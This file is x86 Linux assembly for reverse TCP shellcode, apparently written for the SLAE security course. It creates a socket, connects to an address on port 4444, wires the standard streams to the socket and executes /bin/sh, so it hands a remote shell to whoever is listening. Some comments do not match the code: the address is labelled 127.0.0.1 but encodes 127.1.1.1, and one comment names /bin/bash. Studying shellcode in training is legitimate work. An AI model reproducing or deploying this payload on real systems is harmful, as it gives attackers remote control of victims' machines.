; SLAE - Assignment 2: Shell_reverse_Tcp shellcode (Linux/x86)
; Author: Alain Menelet 
; StudentID - SLAE-3763
; Tested on Ubuntu 16.14.03 LTS
; https://github.com/xophidia/Shellcode/blob/master/compile.sh
; Taille : 74 bytes



global _start

section .text

_start:

	; Création du socket
	; http://man7.org/linux/man-pages/man2/socketcall.2.html
	; int socketcall(int call, unsigned long *args)
	; int socket(int domain, int type, int protocol)
	
	; for domain we use AF_INET(0x2)
	; for type SOCK_STREAM(0x1)
	; for protocol IP (0x0)	

	xor ebx, ebx 			; ebx = 0
	mul ebx					; eax=ebx=edx = 0
	push ebx				; push 0 onto the stack
	inc ebx					; ebx = 1
	push ebx				; push 1 onto the stack
	push byte 0x2			; push 2 onto the stack
	mov ecx, esp			; set ecx to the address of our args
	mov al, 0x66			; syscall socketcall
	int 0x80				; make the syscall socketcall(socket(2,1,0))

	xchg edx, eax			; we need to save the result of socket function for later usage

	
	; création de la connexion
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; we save sockfd just before
	; sockaddr structure

	push 0x0101017f			; @Ip 127.0.0.1
	push dword 0x5c11 		; Port 4444
	inc ebx
    push word bx     		; Ajout de AF_INET et pour eviter d'avoir un null byte
    mov ecx, esp	
	push 0x10				; addrlen
	push ecx				; struct *addr
	push edx				; sockfd
	mov bl, 0x3				; connect call
	mov ecx, esp	
	mov al, 0x66
	int 0x80

	
	; we use dup2 to redirect all std to our sockfd
	; nous allons rediriger les sorties standards vers notre socket
	; int dup2(int oldfd, int newfd);

	xor ecx, ecx
	mov cl, 0x2				; ecx = 2
_:
	mov al, 0x3f			; syscall dup2
	int 0x80
	dec ecx
	jns _
	

	; execve
	; execute un shell /bin/bash when the connection success.

	xor ecx,ecx				; ecx = 0
	mul ecx					; eax = edx =ecx = 0
	push eax				; push 0 onto the stack
	push 0x68732f2f			; push //bin/sh
	push 0x6e69622f
	mov ebx, esp			; save esp into ebx
	mov al, 0xb		
	int 0x80				; make the syscall execve("/bin/sh", NULL, NULL)
